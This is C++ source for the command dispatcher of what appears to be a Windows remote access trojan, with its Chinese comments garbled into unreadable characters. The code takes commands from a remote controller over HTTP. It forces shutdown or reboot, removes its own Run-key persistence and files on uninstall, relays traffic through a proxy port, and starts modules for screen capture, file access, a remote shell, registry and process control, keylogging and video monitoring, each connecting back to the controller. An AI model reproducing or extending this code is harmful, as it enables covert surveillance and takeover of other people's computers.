#include "stdafx.h"
#include <Wininet.h>
#include "PcCortr.h"
#include "MyAdminTrans.h"
#include "MyFrameTrans.h"
#include "MyTlntTrans.h"
#include "MyKeyMonTrans.h"
#include "MyMulitTrans.h"
#include ".\mymaintrans.h"

SOCKEINFO	m_Info = {0};

CMyMainTrans::CMyMainTrans(void)
{
	memset(m_ServerAddr,0,sizeof(m_ServerAddr));
	memset(m_RegInfo,0,sizeof(m_RegInfo));
	memset(m_FileName,0,sizeof(m_FileName));
	m_ServerPort = 0;
	HINTERNET hFp = NULL;
	HANDLE	m_ExitEvent = NULL;
}

CMyMainTrans::~CMyMainTrans(void)
{	
	closesocket(m_Info.m_soListen);
}

void CMyMainTrans::MainThread(LPVOID lPvoid)
{
	SOCKET soRecv = (SOCKET) lPvoid;
	SOCKET soSend = NULL;

	//����Ŀ�Ļ���
	soSend = GetConnectSocket(m_Info.m_DesAddr,m_Info.m_DesPort);
	if(!soSend)
	{
		closesocket(soRecv);
		return;
	}

	SOCKETDATA m_SocketDataLocal = {0};
	SOCKETDATA m_SocketDataRemot = {0};
	m_SocketDataLocal.m_LocalSocket = soRecv;
	m_SocketDataLocal.m_RemotSocket = soSend;
	m_SocketDataRemot.m_LocalSocket = soRecv;
	m_SocketDataRemot.m_RemotSocket = soSend;
	m_SocketDataLocal.m_IsRecv = TRUE;
	m_SocketDataRemot.m_IsRecv = FALSE;

	//���������߳�
	HANDLE hThread[2] = {0};
	hThread[0] = (HANDLE) 
		_beginthread(WorkThread, 0, (LPVOID) &m_SocketDataLocal);
	hThread[1] = (HANDLE)
		_beginthread(WorkThread, 0, (LPVOID) &m_SocketDataRemot);

	//�ȴ��������
	WaitForMultipleObjects(2, hThread, TRUE, INFINITE);
}

void CMyMainTrans::ListenThread(LPVOID lPvoid)
{
	SOCKET s = (SOCKET) lPvoid;
	SOCKET sc = NULL;
	while(1)
	{
		//�ȴ��ͻ�����
		if((sc = accept(s,0,0)) == INVALID_SOCKET) 
			break;

		//�����������߳���
		_beginthread(MainThread, 0, (LPVOID) sc);
	}
}


void CMyMainTrans::WorkThread(LPVOID lPvoid)
{
	LPSOCKETDATA pData = (LPSOCKETDATA) lPvoid;
	if(pData->m_IsRecv)
		CMyMainTrans::TransSocket(pData->m_LocalSocket,pData->m_RemotSocket);
	else
		CMyMainTrans::TransSocket(pData->m_RemotSocket,pData->m_LocalSocket);
}

//��������
void CMyMainTrans::TransSocket(SOCKET m_Sendsocket,SOCKET m_RecvSocket)
{
	char m_Buf[8192] = {0};
	while(1)
	{
		int ret = recv(m_RecvSocket , m_Buf , 8192 ,0);
		if(ret == SOCKET_ERROR || ret == 0) break;
		send(m_Sendsocket,m_Buf,ret,0);
	}
}

SOCKET CMyMainTrans::StartTcp(WORD Port)
{
	SOCKET		Sck;	
	sockaddr_in addr;
	int			optval =  24 * 3600 * 1000;

	memset(&addr,0,sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(Port);

	Sck = socket(AF_INET, SOCK_STREAM, 0);
	if(Sck==INVALID_SOCKET)
		return NULL;

	if(bind(Sck, (sockaddr*)&addr, sizeof(addr)) 
		== SOCKET_ERROR)
	{
		closesocket(Sck);
		return NULL;
	}

	if(setsockopt(Sck,SOL_SOCKET,SO_SNDTIMEO,
		(char * )&optval,sizeof(optval)) 
		== SOCKET_ERROR)
	{
		closesocket(Sck);
		return NULL;
	}

	if(setsockopt(Sck,SOL_SOCKET,SO_RCVTIMEO,
		(char * )&optval,sizeof(optval)) 
		== SOCKET_ERROR)
	{
		closesocket(Sck);
		return NULL;
	}

	if(listen(Sck, SOMAXCONN) == SOCKET_ERROR)
	{
		closesocket(Sck);
		return NULL;
	}

	return Sck;
}

SOCKET CMyMainTrans::GetConnectSocket(char* pServerAddr, UINT nServerPort)
{
	struct sockaddr_in	m_ServerAddr = {0}; 
	int			m_AddrLen = sizeof(struct sockaddr_in);
	SOCKET		m_Socket = 0;

	//��ʼ��������Ϣ
	m_ServerAddr.sin_addr.S_un.S_addr = inet_addr(pServerAddr);
	m_ServerAddr.sin_port = htons(nServerPort); 
	m_ServerAddr.sin_family = AF_INET; 

	//���������׽���
	m_Socket = socket(AF_INET,SOCK_STREAM,0);
	if(m_Socket <= 0)
	{
		//ʧ��
		return NULL;
	}

	//���ӿͻ������
	if(connect(m_Socket,(sockaddr*)& m_ServerAddr,m_AddrLen) 
		== SOCKET_ERROR) 
	{ 
		closesocket(m_Socket); 
		return NULL;
	}

	//���ӳɹ�
	return m_Socket;
}

/*	
**	��������:	RecvData
**	��������:	����ָ���̶�����
**	�������:	hFile		: HTTPͨѶ��� 
				pData		: �������ݻ���
				DataLen		: �����������ݳ���
**	��������:	��
**	���ú���:	��
**	����ֵ	:	BOOL(TRUE-�������ݳɹ�,FALSE-��������ʧ��)
**	��ע	:	��
*/
BOOL CMyMainTrans::RecvData(HINTERNET hFile,LPVOID pData,int DataLen)
{
	char *p = (char*) pData;
	DWORD dwNumberOfBytesToRead = DataLen;
	DWORD dwNumberOfBytesReaded = 0;
	while(dwNumberOfBytesToRead > 0)
	{
		if(!InternetReadFile(hFile,p,dwNumberOfBytesToRead,
			&dwNumberOfBytesReaded))
			return FALSE;

		if(dwNumberOfBytesReaded == 0)
			return FALSE;

		p += dwNumberOfBytesReaded;
		dwNumberOfBytesToRead -= dwNumberOfBytesReaded;
	}
	return TRUE;
}

/*	
**	��������:	ProcessCmd
**	��������:	��������,�����������
**	�������:	hFile		: HTTPͨѶ��� 
				pWorkInfo	: ������������
**	��������:	��
**	���ú���:	��
**	����ֵ	:	BOOL(TRUE-�ɹ�����������,FALSE-�����������ж�)
**	��ע	:	��
*/
BOOL CMyMainTrans::ProcessCmd()
{
	//���ս�������
	CMDINFO m_CmdInfo = {0};
	if(!RecvData(hFp,&m_CmdInfo,sizeof(CMDINFO)))
		return FALSE;

	//ִ�н�������
	switch(m_CmdInfo.m_Command)
	{
		//��������
		case CLIENT_SYSTEM_RESTART	:
			SetEvent(m_ExitEvent);
			ShutDownSystem(FALSE);
			return FALSE;

		//�رջ���
		case CLIENT_SYSTEM_SHUTDOWN	:
			SetEvent(m_ExitEvent);
			ShutDownSystem(TRUE);
			return FALSE;

		//ж�س���
		case CLIENT_PRO_UNINSTALL :
			MyRegDeleteKey(m_RegInfo);
			DeleteFile(m_FileName);
			{
				char* pFind = strrchr(m_FileName,'\\');
				if(pFind != NULL) 
				{
					char m_DesFile[256] = {0};
					char m_SystemPath[256] = {0};
					GetSystemDirectory(m_SystemPath,200);
					sprintf(m_DesFile, "%s%s", m_SystemPath, pFind);
					DeleteFile(m_DesFile);
				}
			}
			SetEvent(m_ExitEvent);
			return FALSE;

		case CLIENT_PROXY :
			{
				closesocket(m_Info.m_soListen);
				strcpy(m_Info.m_DesAddr, m_ServerAddr);
				m_Info.m_DesPort = m_ServerPort;
				m_Info.m_LocalPort = m_CmdInfo.m_DataLen;
				m_Info.m_soListen = StartTcp(m_Info.m_LocalPort);
				if(m_Info.m_soListen)
				{
					//���������߳�
					_beginthread(ListenThread, 0, 
						(LPVOID) m_Info.m_soListen);
				}
			}
			break;

		//��Ļ����
		case CLIENT_FRAME_START :
		//�ļ�����
		case CLIENT_FILES_START :
		//�����ն�
		case CLIENT_TLNT_START :
		//ע������
		case CLIENT_REGEDIT_START :
		//���̹���
		case CLIENT_PROC_START :
		//�������
		case CLIENT_SERVICE_START :
		//���̼��
		case CLIENT_KEYMON_START :
		//��Ƶ���
		case CLIENT_MULIT_START :
			StartClientCtrl(m_CmdInfo.m_Command);
			break;

		//��������
		default : break;
	}
	return TRUE;
}

/*	
**	��������:	SSH_CtrlThread
**	��������:	�����̺߳���
**	�������:	lPvoid		: ����������ݽṹָ�� 
**	��������:	��
**	���ú���:	��
**	����ֵ	:	UINT
**	��ע	:	��
*/
void CMyMainTrans::SSH_CtrlThread(LPVOID lPvoid)
{
	CMyMainTrans* pThis = (CMyMainTrans*) lPvoid;
	if(pThis->m_WorkType == CLIENT_FILES_START)
	{
		//�ļ�����
		CMyAdminTrans m_Trans;
		m_Trans.StartWork(pThis->m_ServerAddr,pThis->m_ServerPort,
			CONN_FILE_MANA_SEND, CONN_FILE_MANA_RECV);
	}
	else if(pThis->m_WorkType == CLIENT_FRAME_START)
	{
		//��Ļ���
		CMyFrameTrans m_Trans;
		m_Trans.StartWork(pThis->m_ServerAddr,pThis->m_ServerPort,
			CONN_FILE_FRAM_SEND, CONN_FILE_FRAM_RECV);
	}
	else if(pThis->m_WorkType == CLIENT_REGEDIT_START)
	{
		//ע���༭
		CMyAdminTrans m_Trans;
		m_Trans.StartWork(pThis->m_ServerAddr,pThis->m_ServerPort,
			CONN_FILE_REGD_SEND, CONN_FILE_REGD_RECV);
	}
	else if(pThis->m_WorkType == CLIENT_TLNT_START)
	{
		//�����ն�
		CMyTlntTrans m_Trans;
		m_Trans.StartWork(pThis->m_ServerAddr,pThis->m_ServerPort,
			CONN_FILE_TLNT_SEND, CONN_FILE_TLNT_RECV);
	}
	else if(pThis->m_WorkType == CLIENT_PROC_START)
	{
		//���̹���
		CMyAdminTrans m_Trans;
		m_Trans.StartWork(pThis->m_ServerAddr,pThis->m_ServerPort,
			CONN_FILE_PROC_SEND, CONN_FILE_PROC_RECV);
	}
	else if(pThis->m_WorkType == CLIENT_SERVICE_START)
	{
		//�������
		CMyAdminTrans m_Trans;
		m_Trans.StartWork(pThis->m_ServerAddr,pThis->m_ServerPort,
			CONN_FILE_SERV_SEND, CONN_FILE_SERV_RECV);
	}
	else if(pThis->m_WorkType == CLIENT_KEYMON_START)
	{
		//���̼��
		CMyKeyMonTrans m_Trans;
		m_Trans.StartWork(pThis->m_ServerAddr,pThis->m_ServerPort,
			CONN_FILE_KEYM_SEND, CONN_FILE_KEYM_RECV);
	}
	else if(pThis->m_WorkType == CLIENT_MULIT_START)
	{
		//��Ƶ���
		CMyMulitTrans m_Trans;
		m_Trans.StartWork(pThis->m_ServerAddr,pThis->m_ServerPort,
			CONN_FILE_MULT_SEND, CONN_FILE_MULT_RECV);
	}
}

/*	
**	��������:	StartClientCtrl
**	��������:	���������߳�
**	�������:	pWorkInfo	: ����������ݽṹָ�� 
**	��������:	��
**	���ú���:	��
**	����ֵ	:	��
**	��ע	:	��
*/
void CMyMainTrans::StartClientCtrl(int iType)
{
	//������Ӧ�����߳�
	m_WorkType = iType;
	_beginthread(SSH_CtrlThread, 0, (LPVOID) this);
}

void CMyMainTrans::ShutDownSystem(BOOL Flag)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	tp.PrivilegeCount = 1;
	HANDLE m_handle;
	HANDLE hThread = GetCurrentThread();
	LookupPrivilegeValue(NULL,SE_SHUTDOWN_NAME,&luid);
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	ImpersonateSelf(SecurityImpersonation);
	OpenThreadToken(hThread,
		TOKEN_ADJUST_PRIVILEGES,TRUE,&m_handle);
	AdjustTokenPrivileges(m_handle,FALSE,&tp,
		sizeof(TOKEN_PRIVILEGES), 
		(PTOKEN_PRIVILEGES) NULL, (PDWORD) NULL);
	if(Flag)
		ExitWindowsEx(EWX_POWEROFF,EWX_FORCE);
	else
		ExitWindowsEx(EWX_REBOOT,EWX_FORCE);
}

void CMyMainTrans::MyRegDeleteKey(char *ValueName)
{
	HKEY hKey = NULL;
	if(RegOpenKeyEx (HKEY_LOCAL_MACHINE,
		"Software\\Microsoft\\Windows\\"
		"CurrentVersion\\Policies\\Explorer\\Run"
		,0,KEY_ALL_ACCESS,&hKey)
		== ERROR_SUCCESS)
	{
		RegDeleteValue(hKey,ValueName);
		RegCloseKey(hKey);
	}

	if(RegOpenKeyEx (HKEY_LOCAL_MACHINE,
		"Software\\Microsoft\\Windows\\"
		"CurrentVersion\\Run"
		,0,KEY_ALL_ACCESS,&hKey)
		== ERROR_SUCCESS)
	{
		RegDeleteValue(hKey,ValueName);
		RegCloseKey(hKey);
	}

	if(RegOpenKeyEx (HKEY_CURRENT_USER,
		"Software\\Microsoft\\Windows\\"
		"CurrentVersion\\Policies\\Explorer\\Run"
		,0,KEY_ALL_ACCESS,&hKey)
		== ERROR_SUCCESS)
	{
		RegDeleteValue(hKey,ValueName);
		RegCloseKey(hKey);
	}

	if(RegOpenKeyEx (HKEY_CURRENT_USER,
		"Software\\Microsoft\\Windows\\"
		"CurrentVersion\\Run"
		,0,KEY_ALL_ACCESS,&hKey)
		== ERROR_SUCCESS)
	{
		RegDeleteValue(hKey,ValueName);
		RegCloseKey(hKey);
	}
}
//��ʼ
void CMyMainTrans::DoWork( HINTERNET HttpFp , 
							HANDLE hExitEvent ,
							char* pServerAddr , 
							int ServerPort ,
							char* pRegInfo ,
							char* pFileName)
{
	//ȡ������Ϣ
	m_ServerPort = ServerPort;
	hFp = HttpFp;
	m_ExitEvent = hExitEvent;
	strcpy(m_RegInfo, pRegInfo);
	strcpy(m_FileName, pFileName);
	strcpy(m_ServerAddr,pServerAddr);

	//��ʼ����
	while(ProcessCmd());
}